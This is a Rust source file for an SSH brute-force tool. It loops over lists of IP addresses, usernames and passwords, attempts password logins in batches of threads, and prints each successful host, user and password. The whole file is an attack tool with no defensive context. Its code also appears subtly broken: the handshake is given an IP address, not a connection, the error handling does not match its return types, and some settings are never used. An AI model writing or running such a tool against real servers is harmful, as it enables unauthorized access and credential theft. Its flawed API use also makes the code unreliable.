use std::collections::HashMap;
use std::fs;
use std::io;
use std::net::IpAddr;
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use libssh2::Session;
use ncurses::*;

const MAX_THREADS: usize = 100;
const UI_WIDTH: i32 = 80;
const UI_HEIGHT: i32 = 24;

struct BruteForceArgs {
    ip: IpAddr,
    username: String,
    password: String,
}

fn attempt_connect(args: BruteForceArgs) -> Option<()> {
    let mut session = Session::new().map_err(|_| ())?;
    session
        .set_option(libssh2::options::USERAUTH_METHODS, "password")
        .map_err(|_| ())?;
    session
        .handshake(args.ip)
        .map_err(|_| ())?;

    if session
        .userauth_password(args.username.as_str(), args.password.as_str())
        .map_err(|_| ())?
    {
        println!("Success: {} {} {}", args.ip, args.username, args.password);
    }

    session.disconnect("").map_err(|_| ())?;
    Some(())
}

fn draw_ui() {
    initscr();
    cbreak();
    noecho();
    curs_set(0);

    let win = newwin(UI_HEIGHT, UI_WIDTH, 0, 0);
    box_(win, 0, 0);
    wrefresh(win);

    delwin(win);
    endwin();
}

fn read_file(filename: &str) -> io::Result<Vec<String>> {
    let contents = fs::read_to_string(filename)?;
    Ok(contents.lines().map(|s| s.to_string()).collect())
}

fn main() {
    let ip_list_file = "ip_list.txt";
    let user_list_file = "user_list.txt";
    let password_list_file = "password_list.txt";
    let timeout = 0;
    let threads = 1;

    let ip_list = read_file(ip_list_file).unwrap();
    let user_list = read_file(user_list_file).unwrap();
    let password_list = read_file(password_list_file).unwrap();

    let threads_args = Arc::new(Mutex::new(Vec::new()));

    for ip in ip_list {
        for user in &user_list {
            for pass in &password_list {
                if threads_args.lock().unwrap().len() >= MAX_THREADS {
                    let threads_args = threads_args.clone();
                    let _ = threads_args
                        .lock()
                        .unwrap()
                        .drain(..)
                        .map(|args| {
                            thread::spawn(move || {
                                let _ = attempt_connect(args);
                            })
                        })
                        .collect::<Vec<_>>()
                        .into_iter()
                        .for_each(|t| t.join().unwrap());
                }

                threads_args
                    .lock()
                    .unwrap()
                    .push(BruteForceArgs {
                        ip: IpAddr::from_str(&ip).unwrap(),
                        username: user.clone(),
                        password: pass.clone(),
                    });
            }
        }
    }

    let threads_args = threads_args.clone();
    threads_args
        .lock()
        .unwrap()
        .drain(..)
        .map(|args| {
            thread::spawn(move || {
                let _ = attempt_connect(args);
            })
        })
        .collect::<Vec<_>>()
        .into_iter()
        .for_each(|t| t.join().unwrap());

    draw_ui();
}
